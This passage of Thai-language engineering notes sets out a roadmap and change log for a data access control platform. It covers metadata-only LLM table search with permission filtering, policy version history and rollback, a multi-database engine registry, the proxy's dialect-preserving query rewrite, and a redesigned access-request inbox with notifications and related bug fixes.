> `เช่น user พิมพ์ว่าอยากได้ข้อมูล ผลิตภัณฑ์ และราคา LLM จะไปหาใน Metadata ให้`
> `แล้ว Suggest table ที่ต้อง Query หรือที่ต้องขอเพิ่มเติมมาให้`

**รูที่มีอยู่จริง** — ช่อง Search ในหน้า Catalog ตอนนี้เป็น keyword match ตรงๆ (`SearchQuery`)
คนที่รู้อยู่แล้วว่าตารางชื่อ `customer` ก็หาเจอ แต่คนที่รู้แค่ว่า *"อยากได้ราคาสินค้า"* ต้องเดาคำ
ว่าองค์กรนี้เรียกมันว่า `price` / `unit_price` / `list_amt` / `mst_prod_prc` — และถ้าเดาผิดก็สรุปว่า
"ไม่มีข้อมูล" ทั้งที่มี นี่คือปัญหาที่ metadata มีคำตอบอยู่แล้ว (description, tag, glossary term,
domain, column comment) แต่ไม่มีอะไรอ่านมันให้

**สิ่งที่จะทำ**

1. หน้า Query เพิ่มโหมด **"บอกสิ่งที่อยากได้"** ข้างๆ ช่อง SQL (เป็น option ไม่ใช่ตัวบังคับ —
   คนที่เขียน SQL เป็นอยู่แล้วต้องไม่ถูกขวาง)
2. Backend รับประโยค → **ค้น metadata ก่อน ไม่ใช่ส่งให้ LLM ก่อน**:
   keyword + trigram บน `asset.name` / `asset.description` / `asset_column.name` /
   `asset_column.description` / `asset_facet` (tag · glossary term · domain) → ได้ candidate ~50 ตัว
3. **กรองด้วยสิทธิ์ของคนที่ถามทันทีตรงนี้** แล้วแบ่งเป็นสองกอง:
   - **กองที่ query ได้เลย** — `QueryService` ตอบ allow
   - **กองที่ต้องขอสิทธิ์** — asset มีอยู่จริงและตรงคำถาม แต่ policy ปฏิเสธ
4. ส่ง **เฉพาะ metadata ของ candidate** ให้ LLM จัดอันดับและเขียนเหตุผล
   (ชื่อ · description · dtype · tag · term — **ไม่มีค่าในตารางแม้แต่แถวเดียว**)
5. ผลลัพธ์บนหน้าจอเป็นการ์ดต่อ asset: ชื่อ · ทำไมถึงน่าจะใช่ · คอลัมน์ที่เกี่ยวข้อง และปุ่ม
   - query ได้ → **"ใส่ SQL ให้"** เติม `SELECT <คอลัมน์ที่แนะนำ> FROM <fqn>` ลง editor
   - ยังไม่มีสิทธิ์ → **"ขอสิทธิ์กับเจ้าของ"** ซึ่งคือปุ่มตัวเดียวกับ M13

**สามข้อที่ห้ามผ่อน**

1. **LLM เห็นแค่ metadata** — ห้ามส่งแถวข้อมูล ห้ามส่ง sample value
   (กฎเดียวกับ `AssistPrompts` ที่มี `AssistPromptsTest.carriesNoValues` ยันอยู่แล้ว)
2. **กรองสิทธิ์ก่อนถาม LLM ไม่ใช่หลัง** — ถ้าปล่อยให้ LLM เห็น candidate ทั้งหมดแล้วค่อยกรอง
   ทีหลัง ฟีเจอร์นี้จะกลายเป็นช่องส่องว่าองค์กรมีตารางอะไรอยู่บ้าง ซึ่งเป็นข้อมูลที่ policy
   ตั้งใจปิด
   ⚠️ **แต่กองที่สอง (ต้องขอสิทธิ์) ตั้งใจเปิดเผยว่า asset นั้นมีอยู่** — เป็นเรื่องเดียวกับความเสี่ยง
   ที่บันทึกไว้ที่ AP.1 และต้องใช้ flag ตัวเดียวกัน (policy ที่ตั้งเป็น "ปฏิเสธโดยไม่บอกอะไรเลย"
   ต้องหายไปจากผลการค้นด้วย ไม่ใช่โผล่ในกองที่สอง) — **flag นี้ยังไม่มี ต้องทำพร้อมกัน**
3. **ยังเป็น per-user gateway** — ใช้ key ของคนที่กด ใครไม่ได้ตั้ง gateway ไว้ โหมดนี้ไม่ขึ้น
   และช่อง SQL ปกติต้องใช้ได้ครบเหมือนเดิม

**ของที่มีอยู่แล้วและต่อยอดได้ทันที** — `SearchQuery` (keyword) · `CatalogQuery` (schema brief
ที่ `LlmAssistResource` ใช้อยู่) · `QueryService` (ตัวตัดสินว่า allow ไหม) · `asset_facet` ที่กาง
ancestor ไว้แล้ว → งานใหม่จริงๆ คือ **ตัวจัดอันดับ + การ์ดผลลัพธ์ + การแบ่งสองกอง**

### AP.5 M17 — ประวัติย้อนหลังของ policy

> `v13 · active ที่เก็บของ policy นี่เก็บไว้ที่ไหนอะ เพิ่ม Roadmap ให้สามารถดูย้อนหลังได้`

**คำตอบก่อน: เก็บอยู่แล้ว และเก็บครบ**

| สิ่งที่เห็น | มาจาก |
|---|---|
| `v13` | `policy.version` — เลขปัจจุบัน บวกทีละ 1 ทุกครั้งที่บันทึก |
| `active` | `policy.lifecycle_state` — `DRAFT` / `PENDING_APPROVAL` / `ACTIVE` / `DISABLED` / `ARCHIVED` |
| **ของเก่าทุกเวอร์ชัน** | **`policy_version`** (มาตั้งแต่ `V3__policy.sql`) — `UNIQUE (policy_id, version)` เก็บ `document` **ทั้งใบ** + `lifecycle_state` ณ ตอนนั้น + `changed_by` + `change_reason` + `changed_at` |

`PolicyStore` เขียน `policy_version` **ก่อน** แก้แถวจริงทุกครั้ง (class doc เขียนไว้ว่า
*"Every write appends to `policy_version` before it changes …"*) เป็น append-only —
rollback ตาม FR-9.2 ต้อง**เขียนเวอร์ชันใหม่** ไม่ใช่ลบหรือแก้ของเก่า เพื่อให้คำถามว่า
"ตอนวันที่ X policy หน้าตาเป็นยังไง" ตอบได้เสมอ

**รูที่มีอยู่จริง — ข้อมูลมี แต่ไม่มีทางดู**

1. `GET /v1/policies/{id}/versions` เปิดอยู่แล้ว (`PolicyResource:109`) และ
   `fetchPolicyVersions()` เขียนไว้แล้วใน `frontend/app/src/api/policies.ts:139`
   — **แต่ไม่มี component ไหนเรียกมันเลยสักที่** ค้นทั้ง `frontend/app/src` แล้วเจอแค่บรรทัดที่ประกาศ
2. `PolicyStore.history()` **SELECT `change_reason` มาแล้วทิ้ง** — map ลง `StoredPolicy`
   ไม่มีช่องให้มัน เหตุผลที่คนกรอกตอนแก้ policy จึงถูกเก็บลง DB แต่ไม่เคยถูกอ่านกลับ
3. **`audit_policy_change` ยังไม่มีใครเขียนลงไปเลยสักแถว** — `grep` ทั้ง `src/main` ไม่เจอ
   ตารางมีตั้งแต่ V3 แต่ว่างเปล่า (FR-8.1 ยังไม่ปิด)
4. ไม่มี **diff** — ต่อให้เปิดสองเวอร์ชันมาดู ก็ต้องอ่าน JSON เทียบเอง
5. ไม่มีปุ่ม **rollback**

**สิ่งที่จะทำ**

1. **แท็บ History** บนหน้า policy detail: ไทม์ไลน์ `v13 → v12 → v11 …` แต่ละแถวบอก
   **ใคร · เมื่อไหร่ · state ตอนนั้น · เหตุผลที่กรอกไว้**
2. **แก้ `PolicyStore.history()` ให้ส่ง `change_reason` กลับมาจริง** (เพิ่มช่องใน `StoredPolicy`
   หรือทำ record แยกสำหรับหน้า history — น่าจะแยกดีกว่า เพราะ `StoredPolicy` ตอนนี้ถูกยัด
   `null` สองช่องเพื่อให้ใช้ซ้ำได้ ซึ่งอ่านยากอยู่แล้ว)
3. **Diff สองเวอร์ชัน** — เทียบที่ระดับ *ความหมาย* ไม่ใช่ระดับ text: selector เปลี่ยนจากอะไรเป็นอะไร
   · subject rule เพิ่ม/ลดเงื่อนไขข้อไหน · row filter · column mask ตัวไหนเข้มขึ้น/ผ่อนลง
   (diff ของ JSON ดิบจะเต็มไปด้วยการสลับลำดับ key ที่ไม่ได้แปลว่าอะไร)
4. **Rollback** — `POST /v1/policies/{id}/rollback/{version}` เขียนเป็น **เวอร์ชันใหม่**
   พร้อมบังคับกรอกเหตุผล · สิทธิ์เท่ากับการแก้ policy · ถ้า policy กำลัง `ACTIVE` ต้อง
   **แสดง impact analysis ก่อน** (มี `ImpactAnalysis` อยู่แล้ว) เพราะ rollback คือการเปลี่ยน
   สิทธิ์ของคนจริงย้อนกลับ ไม่ใช่การ undo ไฟล์
5. **ปิด `audit_policy_change`** ให้ครบ — ใคร แก้อะไร ค่าเดิม→ค่าใหม่ เมื่อไหร่
   (`policy_version` ตอบ "หน้าตาแต่ละเวอร์ชัน" แต่ตอบ "ใครกดอะไรตอนไหน" ได้ไม่ครบ เช่น
   การเปลี่ยน lifecycle อย่างเดียว หรือการ resolve binding ใหม่)

**ข้อควรระวัง** — `policy_version.document` เก็บ policy ทั้งใบ ซึ่งอาจมีชื่อคน/ชื่อทีมใน
subject rule หน้า History จึงต้อง **จำกัดสิทธิ์เท่ากับหน้า policy เอง** ไม่ใช่เปิดกว้างกว่า
เพราะมันคือข้อมูลชุดเดียวกันแค่เก่ากว่า

### AP.7 M18 — รองรับ database type ใหม่โดยไม่ต้องไล่แก้ 14 จุด

> `ต้องออกแบบให้ต่อได้หลาย database type ในอนาคตนะ คำนึงถึงเรื่องนี้แล้วหรือยัง`

**คำตอบตรงๆ: คำนึงถึงแล้วครึ่งเดียว** — ครึ่งที่แพงถูกแล้ว ครึ่งที่ถูกกลับกระจาย

**ส่วนที่พร้อมอยู่แล้ว (ไม่ต้องแตะตอนเพิ่ม engine)**

| ของ | ทำไมถึงพร้อม |
|---|---|
| `PolicyDecision` | ไม่มีคำว่า SQL อยู่ในนั้นเลย — engine ตัดสินโดยไม่รู้ปลายทาง นี่คือผลตอบแทนของการลงทุนทำ Policy IR ตั้งแต่ M0 |
| `SqlDialect` | interface 16 method · `ViewCompiler` + `DecisionSql` เรียกผ่าน interface ล้วน |
| `engine_capability` | ความสามารถต่าง engine เป็น **data** (ตอนนี้ 25 แถว: POSTGRES 12 / SQLSERVER 13) |
| `CredentialResolver` | แยกตาม scheme ไม่ใช่ตาม engine |
| catalog / `asset_facet` | อิง FQN ล้วน |

**ส่วนที่ hardcode อยู่ — นับได้ 14 จุด**

| ไฟล์ | บรรทัด | อาการตอนเพิ่ม engine |
|---|---|---|
| `V1__catalog.sql` | 12 | `CHECK (engine IN ('POSTGRES','SQLSERVER'))` |
| `V4__enforcement.sql` | 37 | `CHECK` ตัวเดียวกันอีกชุด |
| `DataSourceStore.Engine` | 41-44 | enum — **อันนี้ดี** compiler จะชี้ให้เองว่าต้องแก้ที่ไหน |
| `JdbcTargets` | 34-50 | switch สร้าง JDBC URL + ข้อความ `"Phase 1 can only connect to..."` |
| `SourceProbe` | 108-127 | switch + probe SQL ต่อ engine |
| `QueryService.dialectFor()` | 425-428 | `new PostgresDialect()` ตรงๆ ไม่มี registry |
| `JdbcIntrospector` | — | `information_schema` ต่างกันแต่ละเจ้า |
| frontend 6 ไฟล์ | — | `sources.ts` · `SourcesPage.tsx` · `PolicyBuilderPage.tsx` · `enforcement.ts` · `widgets.tsx` · test |

⚠️ **จุดที่อันตรายจริงคือ 3 switch นั้น** — ลืมจุดเดียว**ไม่ error ตอน compile**
แต่ไปพังตอน runtime ด้วยข้อความที่โกหกว่า *"Phase 1 ต่อได้แค่ POSTGRES กับ SQLSERVER"*
ทั้งที่ความจริงคือเราลืมเติม case

**สิ่งที่จะทำ — `SourceEngine` registry ตัวเดียว**

1. `SourceEngine` (interface ใน `dac-common` หรือ `dac-connector-source`) ถือของที่เป็นของ
   engine นั้นทั้งหมดไว้ที่เดียว:
   - `id()` · `displayName()`
   - `jdbcUrl(JdbcTarget)` + `driverClassName()`
   - `dialect()` → `SqlDialect`
   - `probeStatement()` · `readOnlySetup(Connection)`
   - `introspection()` → ตัวอ่าน `information_schema` ของเจ้านั้น
   - `defaultPort()` · `supportsSchemas()` (MySQL ไม่มีชั้น schema แยกจาก database — เป็น
     ความต่างเชิงโครงสร้าง ไม่ใช่แค่ syntax ต้องเผื่อไว้ตั้งแต่ตอนออกแบบ interface)
2. `SourceEngines.of(engineId)` เป็นทางเข้าเดียว — `JdbcTargets`, `SourceProbe`,
   `QueryService.dialectFor()`, `JdbcIntrospector` เลิกมี switch ของตัวเอง
3. **ย้าย `CHECK (engine IN (...))` เป็นตาราง reference `source_engine`** + FK
   → เพิ่ม engine = insert แถว ไม่ใช่เขียน migration แก้ constraint
   (ตาราง `engine_capability` อ้าง FK เดียวกัน)
4. **Frontend อ่านรายการ engine จาก API** (`GET /v1/sources/engines`) แทนที่จะ hardcode
   6 ไฟล์ → หน้า Register a source กับ Policy Builder ได้ตัวเลือกใหม่เองโดยไม่ต้อง deploy FE
5. **test ที่บังคับความครบ** — วนทุก engine ที่ registry รู้จัก แล้วยืนยันว่ามี
   dialect / probe / url template / capability rows ครบ **test นี้คือของที่ทำให้
   "ลืมจุดเดียว" กลายเป็น compile-time problem แทน production problem**

**ลำดับที่ถูกต้อง: ทำ M18 ก่อนเพิ่ม engine ตัวที่สาม ไม่ใช่หลัง**
ถ้าเพิ่ม MySQL ไปก่อนแล้วค่อยมา refactor จะต้อง refactor ของ 3 engine พร้อมกัน
และตอนนั้นจะมี 21 จุดแทนที่จะเป็น 14

**ของที่ยังไม่ต้องรีบ** — `SqlDialect` ตอนนี้พอสำหรับ engine ตระกูล SQL
แต่ถ้าวันหนึ่งต้องต่อของที่ไม่ใช่ SQL (Elasticsearch, MongoDB, REST API) `SqlDialect`
จะไม่พอ ต้องยก abstraction ขึ้นไปอีกชั้นเป็น "compiler ต่อ target type"
**ยังไม่ต้องทำตอนนี้** แต่ `SourceEngine` ควรถูกออกแบบให้ `dialect()` เป็น optional
ตั้งแต่แรก จะได้ไม่ต้องรื้อรอบสอง

### AP.7a M18 ฝั่ง proxy — **ทำไมเราไม่ทำแบบ Denodo (normalize ลง ANSI SQL)**

> `ต้องออกแบบให้ต่อได้หลาย database type ในอนาคตนะ สำหรับวิธีการ Proxy ปรับมาทำส่วนนี้ก่อนเลย เพื่อสร้างฐานให้แข็งแรง`
> `ได้ยินมาว่า Denodo ใช้ ASCII เลยหรอ เราต้องทำขนาดนั้นไหม หรือมี technique ที่ดีกว่า`

**"ASCII" ที่ได้ยินมาน่าจะเป็น ANSI (SQL)** — Denodo มีภาษาของตัวเอง (**VQL**) และ normalize
ทุก query ลง relational algebra กลาง แล้วให้ adapter แต่ละตัวประกาศ **delegation capability**
ว่า push down อะไรได้ ส่วนที่ push down ไม่ได้ **ถูกดึงขึ้นมารันในเอนจินของ Denodo เอง**

**เขาต้องทำแบบนั้นเพราะเขา join ข้าม source เรา *ไม่* join ข้าม source** — หนึ่ง query ไปหนึ่ง
source เสมอ พอไม่ federate ภาษากลางก็ไม่มีประโยชน์ แถมมีโทษ 3 ข้อ:

| โทษ | อธิบาย |
|---|---|
| **ปฏิเสธ SQL ที่ถูกต้องของ user** | `SELECT TOP 10` · `[bracket]` · `::cast` · `ILIKE` — คนเขียน syntax ของ engine ตัวเอง การ normalize ลง ANSI คือการบอกว่า "SQL ที่คุณเขียนถูกแต่เราไม่รับ" |
| **จุดที่ semantic เพี้ยนได้** | normalize แล้ว render กลับ = แปลสองรอบ และการเพี้ยนของเรา**ไม่ใช่ query พัง** แต่คือ **mask หลุด** ซึ่งเป็นความผิดพลาดชนิดที่เงียบ |
| **พาไปสู่การดึงข้อมูลขึ้นมากรองบนแอป** | ทางที่ ANSI พาไปคือ *"อันนี้แปลไม่ได้ ดึงขึ้นมาทำเองดีกว่า"* ซึ่งขัดกับคำตอบที่ให้ผู้ใช้ไว้ตรงๆ ว่า **เราแปลเป็น syntax ปลายทางแล้ว push down ไม่เคยดึงทั้งก้อนขึ้นมา** |

**เทคนิคที่เลือกแทน — dialect-preserving rewrite + capability-declared fail-closed**

```
parse ด้วย grammar ของ engine นั้น (ไม่แปลงเป็นภาษากลาง)
  → resolve table ref  → PolicyEngine → PolicyDecision
  → แทนเฉพาะ FROM node + projection   (AST ส่วนที่เหลือไม่ถูกแตะเลย)
  → unparse กลับด้วย dialect เดิม
  → ถ้า dialect นั้นเขียน mask ตัวที่ decision สั่งไม่ได้ → ปฏิเสธทั้ง query (fail-closed)
```

ผลคือ **พื้นที่ที่ engine-specific เหลือแค่ 2 อย่าง และทั้งสองอย่างถูกประกาศไว้เป็นของที่จับต้องได้**
— `SqlDialect` (วิธีเขียน mask / quote / cast) กับ `engine_capability` (ทำอะไรได้ ไม่ได้)
นี่คือแนวคิด delegation capability ของ Denodo **โดยไม่ต้องแบกเอนจินของเขา**

⚠️ **ข้อที่ห้ามลืมตอน implement:** `engine_capability` ปัจจุบันถูกใช้เตือนตอน *apply* ของ M5/M6
แต่ฝั่ง proxy **ยังไม่มีใครถามมันเลย** — `QueryService` สมมติ PostgresDialect ตรงๆ
(`dialectFor():425-428`) แปลว่าวันที่ต่อ engine ที่เขียน mask บางตัวไม่ได้ proxy จะ**เงียบ**
ไม่ใช่ปฏิเสธ ซึ่งคือ mask หลุด **การเชื่อม capability เข้ากับ proxy คือหัวใจของสไลซ์นี้
ไม่ใช่ของแถม**

**ถ้าวันหนึ่งต้อง join ข้าม source จริงๆ** ค่อยใส่ **Calcite** เป็นชั้น federation ตอนนั้น
(Calcite ให้ ANSI-normalize + per-dialect unparse มาในกล่องอยู่แล้ว) สิ่งที่ต้องระวัง**ตอนนี้**
คือ **อย่าออกแบบอะไรที่ปิดทางนั้น** — ซึ่ง `SourceEngine` registry เปิดทางไว้พอดี เพราะ
federation layer ในอนาคตก็จะถาม registry ตัวเดียวกันว่า engine ปลายทางทำอะไรได้บ้าง

### AP.8 ลำดับที่แนะนำ

```
M9 + M13  ทำพร้อมกัน  (ปุ่มขอสิทธิ์ต้องมีปลายทางรับ)
M14       ทำแยกได้เลย  (ไม่ขึ้นกับใคร แต่ต้องรอ M3 นิ่ง ซึ่งนิ่งแล้ว)
M10 → M15 (ข)          (อธิบายกราฟที่ยังไม่มี ทำไม่ได้)
M15 (ก)   ทำแยกได้เลย  (policy มีครบแล้ว LLM ต่อแล้ว)
M13 → M16              (M16 ใช้ปุ่ม "ขอสิทธิ์" ของ M13 เป็นปลายทางของกองที่สอง
                        และใช้ flag "ปฏิเสธโดยไม่บอกอะไร" ตัวเดียวกัน)
M17       ทำแยกได้เลย  (ข้อมูลกับ endpoint มีครบแล้ว ขาดแค่หน้าจอ + diff + rollback)
          แต่ข้อ 5 ของมัน (audit_policy_change) ควรทำคู่กับ M8 ที่ยังค้างอยู่
M18 → M6  (M6 คือ NativeCompiler ต่อ engine — ถ้าทำ M6 ก่อน M18
           จะได้ switch เพิ่มมาอีกชุดที่ต้องมารื้อทีหลัง)
M18 ก่อนเพิ่ม engine ตัวที่ 3 เสมอ

2026-09-24 ผู้ใช้สั่งสลับลำดับ: **M18 ขึ้นก่อนทุกอย่าง และเริ่มที่ฝั่ง proxy**
  (`ปรับมาทำส่วนนี้ก่อนเลย เพื่อสร้างฐานให้แข็งแรง`) → เหตุผลอยู่ที่ AP.7a
```

---

## รอบนี้ — **ข้อ AZ: หน้า Access requests แบ่งเป็นแท็บ Inbox / My requests · กระดิ่งแจ้งเตือนจริง · ตัวเลขบนเมนู Requests** (+ ข้อ AY.6 เส้นคั่นแทนจุด — commit `04cbc93`)

ผู้ใช้ขอ: *"หน้า Access Request แบ่ง Sub tab ในหน้าจอให้ดีไหม ว่าเป็น My Request, Inbox / และต้องมี Notification ด้วย / ออกแบบหน้านี้ให้สวยหน่อย"* และก่อนหน้านั้น *"จุดพวกนี้คือะไรอะ ไม่สวย"* (จุด `·` คั่นข้อมูลบนหัวหน้า asset — ลอกสไตล์ OM มา → เปลี่ยนเป็นเส้นแนวตั้งบางๆ แล้วใน `04cbc93`)

### AZ.1 Backend — `V22__access_request_notice.sql` + 2 endpoint
- **ไม่มีตาราง "notification" แยก** — เหตุการณ์คือแถวของ `audit_access_request` (V21) อ่านตรงๆ ไม่ copy (สองที่เก็บข้อเท็จจริงเดียวกัน = วันหนึ่งจะไม่ตรงกัน) ที่เก็บเพิ่มมีแค่ `access_request_notice_seen(username PK lower-case, seen_at)` = อ่านถึงไหนแล้ว ใช้นับ "N new"
- index ใหม่ 2 ตัว: `audit_access_request_requester_idx (lower(requester_username), occurred_at DESC)` · `audit_access_request_action_idx (action, occurred_at DESC)`
- `GET /api/v1/access-requests/notifications` → `{unseen, inboxPending, minePending, seenAt, items[]}` — `items` แต่ละตัวมี `kind` (REQUESTED/WITHDRAWN/APPROVED/REJECTED) · `side` (INBOX/MINE) · `requestId` · `assetFqn` · `actor` · `note` · `occurredAt` · `unseen`
  - ฝั่ง INBOX = การขอ/ถอนของ table ที่คนนี้ **ตัดสินได้** (owner match ใช้ของ engine ไม่ใช่ SQL — แบบเดียวกับ inbox) · ฝั่ง MINE = คำตอบต่อคำขอของตัวเอง (**ไม่รวมการขอของตัวเอง** — ไม่ต้องแจ้งสิ่งที่ตัวเองเพิ่งทำ)
  - list ถูก cap แต่ `unseen` ไม่ถูก cap
- `POST /api/v1/access-requests/notifications/seen` → ตั้ง `seen_at = now()` ของคนเรียกเท่านั้น (per person, ประวัติไม่หาย)

### AZ.2 Frontend — กระดิ่ง (`TopNav.tsx` `Notifications`, export แล้วเพื่อเทสต์)
- ตัวเลขแดงนับ **สิ่งที่ยังไม่เคยเห็น** ไม่ใช่ของที่ค้าง — กระดิ่งที่ติดตลอดเวลาทำให้คนเลิกมอง · เปิด popover = อ่านแล้ว (`markRequestNoticesSeen` เฉพาะตอนมีของใหม่) · จุดสีน้ำเงินค้างไว้จนปิด popover
- หัว popover: "N requests waiting for your decision" + ปุ่ม **Review** → `/requests?tab=inbox`
- แต่ละแถว: avatar ของคนทำ + badge เล็ก (✓ อนุมัติ / ✕ ปฏิเสธ / ↩ ถอน / 🔑 ขอ) + "actor verb table" + note ของการปฏิเสธ + เวลาไทยแบบ relative → คลิกไป `/requests?tab=inbox|mine&id=<requestId>`
- admin ยังได้ alert crawl ของ OM ที่พัง/ไม่เคยรันในกระดิ่งเดียวกัน · non-admin **ไม่เรียก** `/system/sync-status` เลย
- ว่าง: "You're all caught up"
- `pages/requests/useRequestNotices.ts` — query เดียว (`NOTICES_KEY`) poll ทุก 30 วิ ใช้ร่วมกันทั้งกระดิ่ง / เมนูซ้าย / แท็บ → ตัวเลขสามที่ไม่มีทางไม่ตรงกัน

### AZ.3 Frontend — เมนูซ้าย (`AppShell.tsx` `NavItem`, export แล้ว)
- "Requests" มี pill ตัวเลข `inboxPending` (เกิน 9 → `9+`) · ตอนพับเมนูเหลือจุด + aria-label "…, N waiting" · 0 = ไม่วาดอะไร

### AZ.4 Frontend — หน้า `/requests` เขียนใหม่ (`AccessRequestsPage.tsx`)
- **Header card**: ไอคอน + "Access requests" + คำอธิบาย + ปุ่ม "Find a table to request" (→ `/catalog`) + สถิติ 2 ช่อง "Waiting for your decision" / "Your open requests" คั่นด้วยเส้นบาง
- **แท็บ** `role=tablist`: **Inbox** · **My requests** พร้อมตัวเลข · state อยู่ใน URL `?tab=inbox|mine&status=&id=` (แชร์ลิงก์/Back ได้) · ไม่มี `tab` → ถ้ามีของรอตัดสินเปิด Inbox ไม่งั้นเปิด My requests
- **Master/detail** (`lg:grid-cols-[24rem_1fr]`): ซ้าย = ตัวกรอง Pending/Approved/Rejected/Withdrawn/All (`role=radiogroup`, บรรทัดเดียว เลื่อนแนวนอนได้) + รายการ (Inbox มี avatar ผู้ขอ, Mine มีไอคอน table) · ขวา = รายละเอียด: หัว + FQN link + "Open table" · Requested by / For / Purpose / Asked · Reason · `<details>` "What was refused" (deniedBy + SQL ที่โดนปฏิเสธ) · **Activity timeline** · ฟอร์ม Decide (Inbox) หรือ Withdraw (Mine)
- ค่าเริ่มต้นตัวกรอง: Inbox = Pending · Mine = All
- `?id=` ที่ไม่อยู่ในรายการ (เช่นมาจากกระดิ่งแต่ตัวกรองไม่ตรง) → ดึงเดี่ยวผ่าน `fetchRequest` · ดึงไม่ได้ → "That request is not one you can see, or it no longer exists."
- logic การตัดสิน **ไม่เปลี่ยน** (ย่อวันได้อย่างเดียว · reject ต้องมี note · approve ไม่ปลด mask)

### AZ.5 เทสต์
- **`AccessRequestIT` +5 (`Notices`)**: owner ได้ยินเฉพาะ table ที่ตัดสินได้ · requester ได้ยินคำตอบไม่ใช่การขอของตัวเอง · ถอนแล้วคนตัดสินได้ยินและ pending ลด · mark seen หยุดตัวเลข ประวัติอยู่ แยกต่อคน · list cap / count ไม่ cap → **`AccessRequestIT` 28 · integration รวม 214**
- **`AccessRequestsPage.test.tsx` 22** (tabs 5 · inbox 12 · my requests 5) · **`RequestNotices.test.tsx` ใหม่ 10** (กระดิ่ง 7 · เมนูซ้าย 3) → **frontend 35 suites / 302 tests**
- ทดสอบบนระบบจริง (`localhost:8090/Arak/`, Flyway → v22) ด้วย Playwright: admin / analyst_a / analyst_b — เมนู "Requests 3", กระดิ่ง "Notifications, N new", Inbox 3 แถว, Decide render, My requests + Withdraw, popover ของผู้ขอเห็น "admin rejected your request for …"

### AZ.6 ข้อควรรู้ในการรันเครื่อง dev
- **TaskStop ฆ่าแค่ `sh` ของ bring-up แต่ `java` ลูกยังถือ :8080 อยู่** → หา PID ของ :8080 (`Get-NetTCPConnection -LocalPort 8080`) ยืนยันว่า CommandLine เป็น `dac-service.jar` ของ ARAK แล้วค่อย `Stop-Process` ก่อน bring-up ใหม่ ไม่งั้น migration ใหม่ไม่ถูกรัน

## รอบก่อนหน้า — **ข้อ AY: ปุ่ม "Open in OpenMetadata" พัง (500) · Request access ย้ายขึ้นมุมขวาบนของหน้า asset · หัวหน้า asset จัดใหม่แบบ OpenMetadata · ทดสอบ flow ขอสิทธิ์ทั้งเส้น + seed เคส demo**

ผู้ใช้ถาม 3 เรื่องติดกัน (2026-09-25):
- *"ทำไม Openin Openmetadata แล้วเจอแบบนี้"* — กดแล้วได้ HTTP 500 `InvalidPathException` บน `/catalog/http:/<om-host>/...`
- *"ปุ่ม Request Access ตรงไหนอะ / แล้วทดสอบหรือยัง Flow Access Control ทั้ง Flow / ช่วยทดสอบ แล้วสร้าง Case จริงในระบบหน่อย เดี๋ยวจะเอาไว้ demo"*
- *"หน้า Asset Detail การจัดวางไม่สวย เหมือน Openmetdata / และ Request Access ควรจะไปอยู่ด้านบนขวาไหม"* (แนบภาพหน้า table ของ OM เทียบกับของเรา) → *"ต่อครับ"*

### AY.1 🐛 "Open in OpenMetadata" → 500 — สาเหตุสองชั้น
1. **Frontend:** ปุ่มของ `@openmetadata/ui-core-components` ที่มี `href` เป็น react-aria `Link` → react-aria ส่งทุก `href` ผ่าน `useHref` ของ `RouterProvider` เรา ซึ่ง `useHref()` ของ react-router ถือ URL เต็ม `http://…` เป็น **path สัมพัทธ์ในแอป** → ลิงก์กลายเป็น `/Arak/catalog/http:/…` แทนที่จะออกไป OM
   - แก้: `frontend/app/src/AriaRouter.tsx` (ใหม่) — `isExternalHref()` จับ href ที่มี scheme (`http:` `https:` `mailto:` …) หรือ `//host` · `AriaRouter` ครอบ `RouterProvider` ด้วย `useHref` ที่ **ปล่อยลิงก์ภายนอกไว้ตามที่เขียน** และใส่ base path `/Arak/` ให้ route ในแอปเหมือนเดิม · `main.tsx` ใช้ `AriaRouter` แทนการประกอบ `RouterProvider` เอง
2. **Backend:** `SpaServlet` เอา path แปลกๆ นั้นไป `Path.resolve()` → บน Windows `:` ในชื่อ path โยน `InvalidPathException` → **500** แทนที่จะเป็นหน้าแอป
   - แก้: `SpaServlet` จับ `InvalidPathException` → ถ้า path ดูเหมือนไฟล์ (มีนามสกุล) ตอบ **404**, ไม่งั้นส่ง `index.html` เหมือน route อื่นของ SPA
- เทสต์: `AriaRouter.test.tsx` 10 เคส (ลิงก์ไป OM คง href เดิม · route ในแอปยังได้ `/Arak/` นำหน้า · `isExternalHref` 8 แบบ: `https://` · `HTTP://` · `mailto:` · `//host` = ภายนอก / `/catalog/x` · `catalog/x` · `svc.db` · ว่าง = ภายใน) · `SpaServletTest.unusualCharacters()` (`/catalog/http:/om.example.test:8585/…` → 200 index.html ไม่ใช่ 500 · `/catalog/svc:db/app.js` → 404)

### AY.2 Request access บนหน้า asset — **ย้ายขึ้นมุมขวาบน** ข้าง "Open in OpenMetadata" / "View as someone"
เหตุผล: OM วาง action ของ asset ไว้มุมขวาบน คนหาปุ่มที่นั่น — และคนเดิน catalog ไม่ควรต้องเขียน SQL แล้วโดนปฏิเสธก่อนถึงจะรู้ว่าต้องขอใคร (ปิดข้อที่ค้างใน M13: *"ปุ่มเดียวกันบนหน้า asset ใน Catalog"*)
- `pages/catalog/AssetRequestAccess.tsx` → export `AssetAccessAction({asset})` · เฉพาะ `TABLE` / `VIEW` (schema / service ไม่มีแถวให้ grant) · ถาม server ผ่าน `fetchEligibility` (queryKey `['access-requests','eligibility',fqn]` — ส่งคำขอแล้ว invalidate `access-requests` ทำให้ปุ่มเปลี่ยนเอง)
- สถานะที่ปุ่มบอก (**server ตัดสินทุกอย่าง** header พูดแค่ที่ถูกบอก):
  | สถานะจาก server | สิ่งที่เห็นมุมขวาบน |
  |---|---|
  | `readable` | ป้ายเขียว **"You can read this"** (ไม่ใช่ปุ่ม) |
  | มี `openRequestId` | ปุ่มรอง **"Access requested"** (ไอคอนนาฬิกา) → ลิงก์ `/requests` |
  | `requestable` | ปุ่มหลักสีน้ำเงิน **"Request access"** → เปิด dialog ฟอร์ม (เหตุผล + จำนวนวัน) |
  | ติด `blockedBy` (DENY / ชั้นบนปฏิเสธ) | ปุ่มรองรูปกุญแจ **"Request access"** → dialog บอกชื่อ policy ที่ขวาง **ไม่มีฟอร์ม** (ขอ owner ไปก็ไม่ช่วย) |
  | ไม่ requestable และไม่มี blockedBy / ยังโหลด / error | ไม่แสดงอะไร |
- dialog = react-aria `ModalOverlay` + `Modal` + `Dialog aria-label="Request access"` แบบเดียวกับ `GrantDialog` · ส่งแล้วค้าง dialog ไว้บอก **"Request sent"** + ลิงก์ Access requests
- `pages/query/RequestAccess.tsx` แตกชิ้นให้ใช้ซ้ำ: export **`RequestAccessForm`** (ฟอร์ม + mutation · catalog mode ส่ง `attemptedSql`/`deniedBy` = null) · **`RequestedNote`** · **`BlockedNote`** · `Note` รับ `className` — **หน้า Query ยังเหมือนเดิมทุกอย่าง** (กล่องใต้ refusal)

